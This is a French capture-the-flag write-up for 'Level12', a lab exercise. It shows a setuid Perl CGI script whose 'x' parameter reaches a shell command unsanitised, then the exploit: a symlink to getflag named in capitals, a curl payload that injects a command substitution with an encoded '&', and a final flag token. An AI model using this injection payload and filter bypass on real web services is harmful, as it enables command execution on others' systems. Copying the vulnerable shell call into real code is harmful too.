# [Level12]

### Observations:
##### J'affiche le contenue du programme '~/level12.pl':
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

##### Détails du programme:
```bash
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

Je me rend compte que ce programme est exécuté par défaut en tant qu'utilisateur 'flag12' grâce à la commande:
```sh
ps aux | grep flag12
```

##### Entrées du programme:
```perl
string x
string y
```

##### Fonctionnement:
Ce programme est composé de deux fonctions aux utilitées douteuses:
 * La fonction \<t>:
	1. Applique un filtre sur 'x' qui transforme les lettres minuscules en majuscules.
	2. Applique un filtre sur 'x' qui enlève tout ce qu'il y a après un caractère de séparation.
	3. Exécute une commande shell qui utilise la variable 'x' modifiée.
 * La fonction \<n> est inutile dans son fonctionnement.

> Le programme tourne sur un serveur tcp par defaut

##### Conclusions:
Ce programme a une faille dans la fonction \<t> plus précisement au moment d'exécuter la commande shell. \
Nous pouvons insérer la commande que nous voulons dans celle-ci tant que nous respectons ces règles simples:
 - Utiliser uniquement des caractères majuscule.
 - Ne pas écrire de caractères de séparation.

### Résolution
Je créer un lien symbolique léger pour me permettre d'exécuter getflag avec des caractères majuscules. \
J'effectue une requête au serveur avec ma commande à injecter que je redirige dans le flux d'erreur. \
Puis j'affiche la dernière ligne du fichier de log du flux d'erreur.

#### commandes:
```bash
ln -s /bin/getflag /tmp/GETFLAG
curl '127.0.0.1:4646?x="$(/*/GETFLAG>%262)"'
tail -n 1 /var/log/apache2/error.log
```
> Notez l'utilisation du shellcode '%26' pour éviter que le caractère de '&' soit pris en compte dans le filtre de séparateurs.


**token :** g1qKMiRpXf53AWhDaU7FEkczr